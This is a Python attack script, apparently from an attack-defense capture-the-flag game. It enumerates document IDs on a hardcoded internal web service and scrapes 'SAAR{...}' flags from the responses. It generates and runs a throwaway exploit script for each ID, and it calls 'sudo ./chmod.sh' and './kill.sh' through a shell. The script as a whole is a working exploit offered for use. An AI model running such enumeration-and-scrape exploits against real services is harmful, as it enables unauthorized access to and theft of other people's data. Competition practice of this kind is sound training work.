#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re, json
import threading
import time
import subprocess, logging


#from storage import storage_set, storage_get

#ip = sys.argv


class StoppableThread(threading.Thread):
    def __init__(self, app_to_run, *args, **kwargs):
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop = threading.Event()
        self.handle = subprocess.Popen(app_to_run, shell=False)

    def stop(self):
        subprocess.Popen("./kill.sh", shell=True)
        self._stop.set()
    def stopped(self):
        return self._stop.isSet()


ip = '10.32.104.2'
url = 'http://' + ip + ':5000'


def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))


def attack():
    s = requests.Session()
    for i in range(3000, 3080):
        filename = generator()
        file = open("5000_{}.py".format(filename), "w")
        file.write("#!/usr/bin/env python3\n")
        file.write("# -*- coding: utf-8 -*-\n")
        file.write("import re ,requests, sys\n")
        file.write("ip = \'{}\'\n".format(ip))
        file.write("url = \'http://\' + ip + \':5000\'\n")
        file.write("i = {}\n".format(i))
        file.write("s = requests.Session()\n")
        file.write("doc = s.get(url + '/Paper/Download?id={}'.format(i))\n")
        file.write("re_flags = re.findall('SAAR\{[A-Za-z0-9-_]{32}\}', doc.text)\n")
        file.write("for flag in re_flags: sys.stdout.write(flag)\n")
        file.close()

        subprocess.Popen("sudo ./chmod.sh", shell=True)
        time.sleep(0.2)

        thread = StoppableThread("./5000_{}.py".format(filename))
        thread.setDaemon(True)
        thread.start()
        time.sleep(2)
        thread.stop()




if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    attack()

